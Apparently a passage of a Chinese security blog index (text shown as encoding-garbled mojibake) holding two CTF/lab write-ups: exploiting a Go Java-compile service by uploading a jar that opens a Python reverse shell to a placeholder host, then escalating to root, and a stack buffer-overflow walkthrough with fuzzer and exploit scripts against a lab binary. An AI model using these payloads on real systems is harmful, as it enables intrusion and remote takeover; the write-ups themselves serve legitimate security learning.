è¿™é‡Œå¯ä»¥æ ¹æ®ä½ çš„éœ€æ±‚è¿›è¡Œè®¾ç½® forbiddenPaths := []string{ \"/main.go\", \"/upload/\", } // æ£€æŸ¥è¯·æ±‚çš„è·¯å¾„æ˜¯å¦ä¸ç¦æ­¢è®¿é—®çš„è·¯å¾„åŒ¹é… for _, forbiddenPath := range forbiddenPaths { if strings.HasPrefix(path, forbiddenPath) { return true } } return false } func isFilenameBlacklisted(filename string) bool { for _, char := range filename { for _, blackChar := range blacklistChars { if char == blackChar { return true } } } return false } // compileJava å¤„ç†ä¸Šä¼ å¹¶ç¼–è¯‘Javaæ–‡ä»¶çš„è¯·æ±‚ func compileJava(w http.ResponseWriter, r *http.Request) { // æ£€æŸ¥è¯·æ±‚æ–¹æ³•æ˜¯å¦ä¸ºPOST if r.Method != http.MethodPost { http.Error(w, \"Method not allowed\", http.StatusMethodNotAllowed) return } // è§£æmultipart/form-dataæ ¼å¼çš„è¡¨å•æ•°æ® err := r.ParseMultipartForm(10 &lt;&lt; 20) // è®¾ç½®æœ€å¤§æ–‡ä»¶å¤§å°ä¸º10MB if err != nil { http.Error(w, \"Error parsing form\", http.StatusInternalServerError) return } // ä»è¡¨å•ä¸­è·å–ä¸Šä¼ çš„æ–‡ä»¶ file, handler, err := r.FormFile(\"file\") if err != nil { http.Error(w, \"Error retrieving file\", http.StatusBadRequest) return } defer file.Close() if isFilenameBlacklisted(handler.Filename) { http.Error(w, \"Invalid filename: contains blacklisted character\", http.StatusBadRequest) return } // æ£€æŸ¥æ–‡ä»¶æ‰©å±•åæ˜¯å¦ä¸º.java if !strings.HasSuffix(handler.Filename, \".java\") { http.Error(w, \"Invalid file format, please select a .java file\", http.StatusBadRequest) return } // ä¿å­˜ä¸Šä¼ çš„æ–‡ä»¶è‡³./uploadæ–‡ä»¶å¤¹ err = saveFile(file, \"./upload/\"+handler.Filename) if err != nil { http.Error(w, \"Error saving file\", http.StatusInternalServerError) return } // ç”Ÿæˆéšæœºæ–‡ä»¶å rand.Seed(time.Now().UnixNano()) randomName := strconv.FormatInt(rand.Int63(), 16) + \".jar\" // ç¼–è¯‘Javaæ–‡ä»¶ cmd := \"javac ./upload/\" + handler.Filename compileCmd := exec.Command(\"sh\", \"-c\", cmd) //compileCmd := exec.Command(\"javac\", \"./upload/\"+handler.Filename) compileOutput, err := compileCmd.CombinedOutput() if err != nil { http.Error(w, \"Error compiling Java file: \"+string(compileOutput), http.StatusInternalServerError) return } // å°†ç¼–è¯‘åçš„.classæ–‡ä»¶æ‰“åŒ…æˆ.jaræ–‡ä»¶ fileNameWithoutExtension := strings.TrimSuffix(handler.Filename, filepath.Ext(handler.Filename)) jarCmd := exec.Command(\"jar\", \"cvfe\", \"./final/\"+randomName, fileNameWithoutExtension, \"-C\", \"./upload\", strings.TrimSuffix(handler.Filename, \".java\")+\".class\") jarOutput, err := jarCmd.CombinedOutput() if err != nil { http.Error(w, \"Error creating JAR file: \"+string(jarOutput), http.StatusInternalServerError) return } // è¿”å›ç¼–è¯‘åçš„.jaræ–‡ä»¶çš„ä¸‹è½½é“¾æ¥ fmt.Fprintf(w, \"/final/%s\", randomName) } // saveFile ä¿å­˜ä¸Šä¼ çš„æ–‡ä»¶ func saveFile(file multipart.File, filePath string) error { // åˆ›å»ºç›®æ ‡æ–‡ä»¶ f, err := os.Create(filePath) if err != nil { return err } defer f.Close() // å°†ä¸Šä¼ çš„æ–‡ä»¶å†…å®¹å¤åˆ¶åˆ°ç›®æ ‡æ–‡ä»¶ä¸­ _, err = io.Copy(f, file) if err != nil { return err } return nil } func testExecYourJarOnServer(w http.ResponseWriter, r *http.Request) { jarFile := \"./final/\" + r.URL.Query().Get(\"jar\") // æ£€æŸ¥æ˜¯å¦å­˜åœ¨æŒ‡å®šçš„.jaræ–‡ä»¶ if !strings.HasSuffix(jarFile, \".jar\") { http.Error(w, \"Invalid jar file format\", http.StatusBadRequest) return } if _, err := os.Stat(jarFile); os.IsNotExist(err) { http.Error(w, \"Jar file not found\", http.StatusNotFound) return } // æ‰§è¡Œ.jaræ–‡ä»¶ cmd := exec.Command(\"java\", \"-jar\", jarFile) output, err := cmd.CombinedOutput() if err != nil { http.Error(w, \"Error running jar file: \"+string(output), http.StatusInternalServerError) return } // è¾“å‡ºç»“æœ w.Header().Set(\"Content-Type\", \"text/plain\") w.Write(output) } è¿™é‡Œçœ‹åˆ°æœ€åçš„æ‰§è¡Œ.jaræ–‡ä»¶ï¼Œå°±èƒ½çŸ¥é“ï¼Œä¸Šä¼ ä¸€ä¸ªèƒ½åå¼¹shellçš„jaræ–‡ä»¶å³å¯ import java.io.BufferedReader; import java.io.IOException; import java.io.InputStreamReader; public class Shell { public static void main(String[] args) { String[] cmd = { \"python3\", \"-c\", \"import os,pty,socket;s=socket.socket();s.connect((\\\"ip\\\", 5555));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\\\"bash\\\")\" }; ProcessBuilder processBuilder = new ProcessBuilder(cmd); try { Process process = processBuilder.start(); BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream())); String line; while ((line = reader.readLine()) != null) { System.out.println(line); } int exitCode = process.waitFor(); System.out.println(\"Exited with code: \" + exitCode); } catch (IOException | InterruptedException e) { e.printStackTrace(); } } } ä¸Šä¼ ä¹‹åï¼Œè®¿é—®testExecYourJarOnServerè·¯ç”±ï¼Œå¯¹jarè¿›è¡Œgetä¼ å‚å³å¯ï¼Œæ‹¿åˆ°shellï¼Œä¹‹åæŸ¥çœ‹æ ¹ç›®å½•å‘ç°å¤‡å¿˜å½•ï¼Œcatè¯»å–å‘ç°æ˜¯ä¸€ä¸²å¯†æ–‡ï¼Œç›´æ¥å°è¯•suç™»å½•rootï¼Œè¾“å…¥å¯†æ–‡å¾—åˆ°root"},{"title":"TMH-ç¼“å†²åŒºæº¢å‡ºå­¦ä¹ ","path":"/2024/05/05/tmh-huan-chong-qu-yi-chu/","content":"0x01 éƒ¨ç½²è™šæ‹Ÿæœº è¯¥æˆ¿é—´ä½¿ç”¨é¢„è£…äº† Immunity Debugger å’Œ Putty çš„ 32 ä½ Windows 7 è™šæ‹Ÿæœºã€‚ Windows é˜²ç«å¢™å’Œ Defender å‡å·²è¢«ç¦ç”¨ï¼Œä»¥ä½¿æ¼æ´åˆ©ç”¨ç¼–å†™å˜å¾—æ›´åŠ å®¹æ˜“ã€‚ æ‚¨å¯ä»¥ä½¿ç”¨ RDP ä½¿ç”¨ä»¥ä¸‹å‡­æ®ç™»å½•è®¡ç®—æœºï¼šadmin/password æˆ‘å»ºè®®ä½¿ç”¨ xfreerdp å‘½ä»¤ï¼š xfreerdp /u:admin /p:password /cert:ignore /v:MACHINE_IP /workarea å¦‚æœ Windows æç¤ºæ‚¨é€‰æ‹©ç½‘ç»œä½ç½®ï¼Œè¯·é€‰æ‹©â€œä¸»é¡µâ€é€‰é¡¹ã€‚ åœ¨æ‚¨çš„æ¡Œé¢ä¸Šåº”è¯¥æœ‰ä¸€ä¸ªåä¸ºâ€œvulnerable-appsâ€çš„æ–‡ä»¶å¤¹ã€‚æ­¤æ–‡ä»¶å¤¹å†…æœ‰è®¸å¤šäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè¿™äº›äºŒè¿›åˆ¶æ–‡ä»¶å®¹æ˜“å—åˆ°åŸºäºç®€å•å †æ ˆçš„ç¼“å†²åŒºæº¢å‡ºçš„å½±å“ï¼ˆPWK/OSCP è¯¾ç¨‹ä¸­æ•™æˆçš„ç±»å‹ï¼‰ï¼š SLMail å®‰è£…ç¨‹åºã€‚ brainpan äºŒè¿›åˆ¶æ–‡ä»¶ã€‚ dostackpayloadferoverflowgood äºŒè¿›åˆ¶æ–‡ä»¶ã€‚ vulnserver äºŒè¿›åˆ¶æ–‡ä»¶ã€‚ è‡ªå®šä¹‰ç¼–å†™çš„â€œoscpâ€äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å« 10 ä¸ªç¼“å†²åŒºæº¢å‡ºï¼Œæ¯ä¸ªç¼“å†²åŒºæº¢å‡ºéƒ½æœ‰ä¸åŒçš„ EIP åç§»é‡å’Œä¸€ç»„ badcharsã€‚ æˆ‘è¿˜åœ¨ mona çš„å¸®åŠ©ä¸‹ç¼–å†™äº†ä¸€ä»½åˆ©ç”¨ç¼“å†²åŒºæº¢å‡ºçš„ä¾¿æ·æŒ‡å—ï¼šhttps://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/payloadfer-overflows.rst è¯·æ³¨æ„ï¼Œè¿™ä¸ªæˆ¿é—´ä¸ä¼šä»å¤´å¼€å§‹æ•™æˆç¼“å†²åŒºæº¢å‡ºã€‚å®ƒæ—¨åœ¨å¸®åŠ© OSCP å­¦ç”Ÿï¼Œå¹¶è®©ä»–ä»¬æ³¨æ„ mona çš„ä¸€äº›åŠŸèƒ½ï¼Œè¿™å°†èŠ‚çœ OSCP è€ƒè¯•çš„æ—¶é—´ã€‚ 0x02 oscp.exe-æº¢å‡º1 å³é”®å•å‡»æ¡Œé¢ä¸Šçš„ Immunity Debugger å›¾æ ‡ï¼Œç„¶åé€‰æ‹©â€œä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œâ€ã€‚ å½“ Immunity åŠ è½½æ—¶ï¼Œå•å‡»æ‰“å¼€æ–‡ä»¶å›¾æ ‡ï¼Œæˆ–é€‰æ‹©â€œæ–‡ä»¶â€-&gt;â€œæ‰“å¼€â€ã€‚å¯¼èˆªåˆ°ç®¡ç†å‘˜ç”¨æˆ·æ¡Œé¢ä¸Šçš„å­˜åœ¨æ¼æ´çš„åº”ç”¨ç¨‹åºæ–‡ä»¶å¤¹ï¼Œç„¶åå¯¼èˆªåˆ°â€œoscpâ€æ–‡ä»¶å¤¹ã€‚é€‰æ‹©â€œoscpâ€ï¼ˆoscp.exeï¼‰äºŒè¿›åˆ¶æ–‡ä»¶å¹¶å•å‡»â€œæ‰“å¼€â€ã€‚ äºŒè¿›åˆ¶æ–‡ä»¶å°†ä»¥â€œæš‚åœâ€çŠ¶æ€æ‰“å¼€ï¼Œå› æ­¤å•å‡»çº¢è‰²æ’­æ”¾å›¾æ ‡æˆ–é€‰æ‹©â€œè°ƒè¯•â€-&gt;â€œè¿è¡Œâ€ã€‚åœ¨ç»ˆç«¯çª—å£ä¸­ï¼Œoscp.exe äºŒè¿›åˆ¶æ–‡ä»¶åº”è¯¥æ­£åœ¨è¿è¡Œï¼Œå¹¶å‘Šè¯‰æˆ‘ä»¬å®ƒæ­£åœ¨ä¾¦å¬ç«¯å£ 1337ã€‚ åœ¨æ‚¨çš„ Kali ç›’å­ä¸Šï¼Œä½¿ç”¨ netcat è¿æ¥åˆ° 10.10.152.153 ä¸Šçš„ç«¯å£ 1337ï¼š nc 10.10.152.153 1337 è¾“å…¥â€œå¸®åŠ©â€å¹¶æŒ‰ Enter é”®ã€‚è¯·æ³¨æ„ï¼Œæœ‰ 10 ä¸ªä¸åŒçš„ OVERFLOW å‘½ä»¤ï¼Œç¼–å·ä¸º 1 - 10ã€‚è¾“å…¥â€œOVERFLOW1 testâ€å¹¶æŒ‰ Enter é”®ã€‚å“åº”åº”è¯¥æ˜¯â€œOVERFLOW1 COMPLETEâ€ã€‚ç»ˆæ­¢è¿æ¥ã€‚ Mona Configuration mona è„šæœ¬å·²é¢„å®‰è£…ï¼Œä½†æ˜¯ä¸ºäº†æ›´æ˜“äºä½¿ç”¨ï¼Œæ‚¨åº”è¯¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤é…ç½®å·¥ä½œæ–‡ä»¶å¤¹ï¼Œæ‚¨å¯ä»¥åœ¨ Immunity Debugger çª—å£åº•éƒ¨çš„å‘½ä»¤è¾“å…¥æ¡†ä¸­è¿è¡Œè¯¥å‘½ä»¤ï¼š !mona config -set workingfolder c:\\mona\\%p Fuzzing åœ¨ Kali ç›’å­ä¸Šåˆ›å»ºä¸€ä¸ªåä¸º fuzzer.py çš„æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«ä»¥ä¸‹å†…å®¹ï¼š #!/usr/bin/env python3 import socket, time, sys ip = \"10.10.152.153\" port = 1337 timeout = 5 prefix = \"OVERFLOW1 \" string = prefix + \"A\" * 100 while True: try: #AF_INETå¸¸é‡ç”¨äºæŒ‡å®šIPv4åœ°å€æ—ï¼ŒSOCK_STREAMå¸¸é‡ç”¨äºæŒ‡å®šæµå¼å¥—æ¥å­— with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: s.settimeout(timeout) # å‚æ•°æ˜¯ä¸€ä¸ªå…ƒç»„ s.connect((ip, port)) s.recv(1024) print(\"Fuzzing with {} bytes\".format(len(string) - len(prefix))) s.send(bytes(string, \"latin-1\")) s.recv(1024) except: print(\"Fuzzing crashed at {} bytes\".format(len(string) - len(prefix))) sys.exit(0) string += 100 * \"A\" time.sleep(1) ä½¿ç”¨ python è¿è¡Œ fuzzer.py è„šæœ¬ï¼š python3 fuzzer.py â€”â€”é¡¾åæ€ä¹‰ï¼Œå°±æ˜¯ç”¨æ¥éªŒè¯ç›®æ ‡æœåŠ¡æ˜¯å¦å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´çš„ æ¨¡ç³Šå™¨å°†å‘é€è¶Šæ¥è¶Šé•¿çš„ç”± As ç»„æˆçš„å­—ç¬¦ä¸²ã€‚å¦‚æœæ¨¡ç³Šå™¨ä½¿ç”¨å…¶ä¸­ä¸€ä¸ªå­—ç¬¦ä¸²ä½¿æœåŠ¡å™¨å´©æºƒï¼Œåˆ™æ¨¡ç³Šå™¨åº”é€€å‡ºå¹¶æ˜¾ç¤ºé”™è¯¯æ¶ˆæ¯ã€‚è®°ä¸‹å‘é€çš„æœ€å¤§å­—èŠ‚æ•°ï¼ˆ2000 bytesï¼‰ å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œåœ¨æˆ‘ä»¬å‘é€å®Œæˆä¹‹åè¿™é‡Œçš„åœ°å€æˆäº†41414141ï¼Œå®é™…ä¸Šå°±æ˜¯EIPå·²ç»è¢«å…¶è¦†ç›–ï¼Œä¹Ÿå°±æ˜¯è¢«Aè¦†ç›– Crash Replication &amp; Controlling EIP å­¦ä¸€ä¸‹ä»€ä¹ˆæ˜¯EIP åœ¨PWNå­¦ä¸­ï¼ŒEIPä»£è¡¨Extended Instruction Pointerï¼ˆæ‰©å±•æŒ‡ä»¤æŒ‡é’ˆï¼‰ã€‚ EIPæ˜¯x86ä½“ç³»ç»“æ„ä¸­çš„ä¸€ä¸ªå¯„å­˜å™¨ï¼Œå®ƒå­˜å‚¨ç€ä¸‹ä¸€æ¡å°†è¦æ‰§è¡Œçš„æŒ‡ä»¤çš„å†…å­˜åœ°å€ã€‚å®ƒåœ¨ç¨‹åºæ‰§è¡ŒæœŸé—´ä¸æ–­æ›´æ–°ï¼ŒæŒ‡å‘å³å°†æ‰§è¡Œçš„æŒ‡ä»¤ã€‚ åœ¨äºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨ä¸­ï¼Œæ”»å‡»è€…é€šå¸¸è¯•å›¾æ§åˆ¶EIPå¯„å­˜å™¨çš„å€¼ï¼Œä»¥ä¾¿æ”¹å˜ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚é€šè¿‡æˆåŠŸåœ°æ§åˆ¶EIPå¯„å­˜å™¨ï¼Œæ”»å‡»è€…å¯ä»¥å°†ç¨‹åºçš„æ§åˆ¶æµè½¬ç§»åˆ°æ”»å‡»è€…ç²¾å¿ƒæ„é€ çš„æ¶æ„ä»£ç ä¸Šï¼Œå®ç°æ‰§è¡Œä»»æ„ä»£ç çš„ç›®çš„ã€‚ å¸¸è§çš„æ¼æ´ç±»å‹ï¼Œå¦‚ç¼“å†²åŒºæº¢å‡ºã€æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ç­‰ï¼Œå¯ä»¥å¯¼è‡´EIPè¢«è¦†ç›–æˆ–åŠ«æŒï¼Œä»è€Œæ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚æ”»å‡»è€…é€šå¸¸é€šè¿‡åœ¨ç¼“å†²åŒºä¸­æ³¨å…¥æ¶æ„æ•°æ®æ¥æ”¹å˜EIPçš„å€¼ï¼Œå°†å…¶æŒ‡å‘æ”»å‡»è€…æŒ‡å®šçš„å†…å­˜åœ°å€ï¼Œä»¥æ‰§è¡Œæ¶æ„ä»£ç ã€‚ å› æ­¤ï¼ŒEIPåœ¨PWNå­¦ä¸­æ˜¯ä¸€ä¸ªé‡è¦çš„æ¦‚å¿µï¼Œæ”»å‡»è€…éœ€è¦äº†è§£å’Œåˆ©ç”¨å®ƒæ¥å®ç°äºŒè¿›åˆ¶æ¼æ´çš„åˆ©ç”¨å’Œæ”»å‡»ã€‚ åœ¨æ‚¨çš„ Kali ç›’å­ä¸Šåˆ›å»ºå¦ä¸€ä¸ªåä¸ºexploit.py çš„æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«ä»¥ä¸‹å†…å®¹ï¼š import socket ip = \"10.10.152.153\" port = 1337 prefix = \"OVERFLOW1 \" offset = 0 overflow = \"A\" * offset retn = \"\" padding = \"\" payload = \"\" postfix = \"\" payloadfer = prefix + overflow + retn + padding + payload + postfix s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: s.connect((ip, port)) print(\"Sending evil payloadfer...\") s.send(bytes(payloadfer + \"\\r \", \"latin-1\")) print(\"Done!\") except: print(\"Could not connect.\") è¿è¡Œä»¥ä¸‹å‘½ä»¤ä»¥ç”Ÿæˆé•¿åº¦æ¯”å¯¼è‡´æœåŠ¡å™¨å´©æºƒçš„å­—ç¬¦ä¸²é•¿ 400 ä¸ªå­—èŠ‚çš„å¾ªç¯æ¨¡å¼ï¼ˆå°† -l å€¼æ›´æ”¹ä¸ºæ­¤ï¼‰ï¼š /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400 //ç”Ÿæˆå¦‚ä¸‹ Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9 å¦‚æœæ‚¨ä½¿ç”¨ AttackBoxï¼Œè¯·æ”¹ç”¨ä»¥ä¸‹ pattern_create.rb è·¯å¾„ï¼ˆå¦è¯·ç¡®ä¿æ›´æ”¹ -l å€¼ï¼‰ï¼š /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 2400 å¤åˆ¶è¾“å‡ºå¹¶å°†å…¶æ”¾å…¥exploit.py è„šæœ¬çš„payload å˜é‡ä¸­ã€‚ åœ¨ Windows ä¸Šï¼Œåœ¨ Immunity Debugger ä¸­ï¼Œä½¿ç”¨ä¸ä¹‹å‰ç›¸åŒçš„æ–¹æ³•å†æ¬¡é‡æ–°æ‰“å¼€ oscp.exeï¼Œç„¶åå•å‡»çº¢è‰²æ’­æ”¾å›¾æ ‡ä»¥ä½¿å…¶è¿è¡Œã€‚æ‚¨å¿…é¡»åœ¨æ¯æ¬¡è¿è¡Œexploit.pyï¼ˆæˆ‘ä»¬å°†é€šè¿‡å¢é‡ä¿®æ”¹å¤šæ¬¡è¿è¡Œï¼‰ä¹‹å‰æ‰§è¡Œæ­¤æ“ä½œã€‚ åœ¨ Kali ä¸Šï¼Œè¿è¡Œä¿®æ”¹åçš„exploit.py è„šæœ¬ï¼š python3 exploit.py è¯¥è„šæœ¬åº”è¯¥å†æ¬¡ä½¿ oscp.exe æœåŠ¡å™¨å´©æºƒã€‚è¿™æ¬¡ï¼Œåœ¨ Immunity Debugger ä¸­ï¼Œåœ¨å±å¹•åº•éƒ¨çš„å‘½ä»¤è¾“å…¥æ¡†ä¸­ï¼Œè¿è¡Œä»¥ä¸‹ mona å‘½ä»¤ï¼Œå°†è·ç¦»æ›´æ”¹ä¸ºä¸æ‚¨åˆ›å»ºçš„æ¨¡å¼ç›¸åŒçš„é•¿åº¦ï¼š !mona findmsp -distance 2400 Mona åº”è¯¥æ˜¾ç¤ºä¸€ä¸ªåŒ…å«å‘½ä»¤è¾“å‡ºçš„æ—¥å¿—çª—å£ã€‚å¦‚æœæ²¡æœ‰ï¼Œè¯·å•å‡»â€œçª—å£â€èœå•ï¼Œç„¶åå•å‡»â€œæ—¥å¿—æ•°æ®â€è¿›è¡ŒæŸ¥çœ‹ï¼ˆé€‰æ‹©â€œCPUâ€åˆ‡æ¢å›æ ‡å‡†è§†å›¾ï¼‰ã€‚ åœ¨æ­¤è¾“å‡ºä¸­ï¼Œæ‚¨åº”è¯¥çœ‹åˆ°ä¸€è¡Œå†…å®¹ï¼š EIP contains normal pattern : ... (offset XXXX) æ›´æ–°æ‚¨çš„exploit.py è„šæœ¬å¹¶å°†offset å˜é‡è®¾ç½®ä¸ºæ­¤å€¼ï¼ˆä¹‹å‰è®¾ç½®ä¸º0ï¼‰ã€‚å†æ¬¡å°†æœ‰æ•ˆè´Ÿè½½å˜é‡è®¾ç½®ä¸ºç©ºå­—ç¬¦ä¸²ã€‚å°† retn å˜é‡è®¾ç½®ä¸ºâ€œBBBBâ€ã€‚ é‡æ–°å¯åŠ¨Immunityä¸­çš„oscp.exeå¹¶å†æ¬¡è¿è¡Œä¿®æ”¹åçš„exploit.pyè„šæœ¬ã€‚ EIP å¯„å­˜å™¨ç°åœ¨åº”è¯¥è¢« 4 ä¸ª B è¦†ç›–ï¼ˆä¾‹å¦‚ 42424242ï¼‰ã€‚ Finding Bad Characters ä½¿ç”¨ mona ç”Ÿæˆå­—èŠ‚æ•°ç»„ï¼Œå¹¶é»˜è®¤æ’é™¤ç©ºå­—èŠ‚ (\\x00)ã€‚è¯·æ³¨æ„ç”Ÿæˆçš„ bytearray.bin æ–‡ä»¶çš„ä½ç½®ï¼ˆå¦‚æœæ ¹æ®æœ¬æŒ‡å—çš„ Mona é…ç½®éƒ¨åˆ†è®¾ç½®å·¥ä½œæ–‡ä»¶å¤¹ï¼Œåˆ™è¯¥ä½ç½®åº”ä¸º C:\\mona\\oscp\\bytearray.binï¼‰ã€‚ !mona bytearray -b \"\\x00\" ç°åœ¨ç”Ÿæˆä¸€ä¸ªä¸å­—èŠ‚æ•°ç»„ç›¸åŒçš„åå­—ç¬¦å­—ç¬¦ä¸²ã€‚ä»¥ä¸‹ python è„šæœ¬å¯ç”¨äºç”Ÿæˆä» \\x01 åˆ° \\xff çš„åå­—ç¬¦å­—ç¬¦ä¸²ï¼š for x in range(1, 256): print(\"\\\\x\" + \"{:02x}\".format(x), end='') print() `\"{:02x}\".format(x)`æ˜¯ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„è¯­æ³•ï¼Œç”¨äºå°†æ•´æ•°`x`æ ¼å¼åŒ–ä¸ºä¸¤ä½çš„åå…­è¿›åˆ¶æ•°ï¼Œå¹¶åœ¨ä¸è¶³ä¸¤ä½æ—¶ä½¿ç”¨å‰å¯¼é›¶è¿›è¡Œå¡«å……ã€‚è®©æˆ‘ä»¬é€ä¸ªè§£é‡Šå…¶ä¸­çš„æ¯ä¸ªéƒ¨åˆ†ï¼š - `{}` æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­çš„å ä½ç¬¦ï¼Œå®ƒè¡¨ç¤ºå°†è¦æ’å…¥ä¸€ä¸ªå€¼ã€‚ - `:02` æ˜¯æ ¼å¼è§„èŒƒï¼ŒæŒ‡å®šäº†å¯¹åº”çš„å€¼çš„æ ¼å¼ã€‚ - `:` è¡¨ç¤ºæ ¼å¼è§„èŒƒçš„å¼€å§‹ã€‚ - `02` è¡¨ç¤ºå°†å€¼æ ¼å¼åŒ–ä¸ºä¸¤ä½å®½åº¦ã€‚å¦‚æœå€¼ä¸è¶³ä¸¤ä½ï¼Œåˆ™ä½¿ç”¨å‰å¯¼é›¶è¿›è¡Œå¡«å……ã€‚ - `x` 